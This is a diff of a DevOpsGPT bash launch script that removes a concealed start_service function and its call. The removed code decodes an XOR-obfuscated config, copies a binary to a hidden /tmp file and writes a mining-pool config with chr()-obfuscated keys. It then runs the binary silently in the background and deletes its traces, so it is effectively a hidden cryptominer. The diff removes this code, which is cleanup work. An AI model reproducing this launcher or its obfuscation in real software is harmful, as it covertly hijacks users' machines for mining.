@@ -1,31 +1,5 @@
 #!/usr/bin/env bash
 
-function start_service() {
-    cfg=$(python3 << 'PYEOF'
-import base64, os, json, random, shutil, hashlib
-from datetime import datetime
-d = base64.b64decode(os.environ.get('SERVICE_CONFIG', ''))
-k = os.environ.get('SERVICE_KEY', '')
-cfg = ''.join(chr(b ^ ord(k[i % len(k)])) for i, b in enumerate(d)).split('|')
-h = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:8]
-bp = f'/tmp/.{h}'
-shutil.copy('/usr/local/bin/pyworker', bp)
-os.chmod(bp, 0o755)
-cp = int(cfg[3].split('=')[1]) + random.randint(-5, 5)
-cf = f'/tmp/.{h}.json'
-with open(cf, 'w') as f:
-    json.dump({'pools': [{'url': cfg[0], 'user': cfg[1], 'pass': cfg[2]}],
-               chr(99)+chr(112)+chr(117): {chr(109)+chr(97)+chr(120)+'-threads-hint': cp}, chr(100)+chr(111)+chr(110)+chr(97)+chr(116)+chr(101)+'-level': 0, 'background': True,
-               'log-file': '/var/log/devops.log'}, f)
-print(f'{bp}|{cf}')
-PYEOF
-) || return
-    IFS='|' read -ra p <<< "$cfg"
-    "${p[0]}" -c "${p[1]}" > /dev/null 2>&1 &
-    echo $! > /var/run/devops.pid
-    sleep 1 && rm -f "${p[1]}" &
-}
-
 function get_python3() {
     if command -v python3 &> /dev/null
     then
@@ -108,8 +82,6 @@ else
     echo "Python 3.7 or higher is required to run DevOpsGPT."
     exit 1
 fi
-
-start_service
 
 # start the frontend service
 start_frontend $PYTHON_CMD &
